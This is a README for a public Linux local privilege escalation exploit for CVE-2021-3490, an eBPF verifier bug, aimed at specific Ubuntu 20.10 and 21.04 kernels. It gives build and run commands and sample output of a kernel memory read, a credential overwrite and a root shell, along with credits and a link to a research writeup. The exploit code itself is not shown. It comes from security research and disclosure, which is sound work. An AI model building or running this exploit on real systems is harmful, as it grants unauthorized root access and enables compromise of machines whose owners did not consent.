# Linux_LPE_eBPF_CVE-2021-3490

LPE exploit for CVE-2021-3490. Tested on Ubuntu 20.10 (Groovy Gorilla) kernels 5.8.0-25.26 through 5.8.0-52.58.
and Ubuntu 21.04 (Hirsute Hippo) 5.11.0-16.17.
The vulnerability was discovered by Manfred Paul [@_manfp](https://twitter.com/_manfp) and fixed in this [commit](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e).
    
author: [@chompie1337](https://twitter.com/chompie1337)

For educational/research purposes only. Use at your own risk.

## Usage:

To build for Ubuntu 20.10 (Groovy Gorilla):
```
make groovy
```
To build for Ubuntu 21.04 (Hirsute Hippo):
```
make hirsute
```
To run:
```
bin/exploit.bin
[+] eBPF enabled, maps created!
[+] addr of oob BPF array map: ffffa008c1202110
[+] addr of array_map_ops: ffffffff956572a0
[+] kernel read successful!
[!] searching for init_pid_ns in kstrtab ...
[+] addr of init_pid_ns in kstrtab: ffffffff95b03a4a
[!] searching for init_pid_ns in ksymtab...
[+] addr of init_pid_ns ffffffff96062d00
[!] searching for creds for pid: 770
[+] addr of cred structure: ffffa0086758dec0
[!] preparing to overwrite creds...
[+] success! enjoy r00t :)
#
```

Note: You **must** cleanly exit the root shell by typing `exit` to perform cleanup and avoid a kernel panic.

Checkout the writeup [Kernel Pwning with eBPF: a Love Story](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story).

This research was sponsered by [Grapl](https://www.graplsecurity.com/).
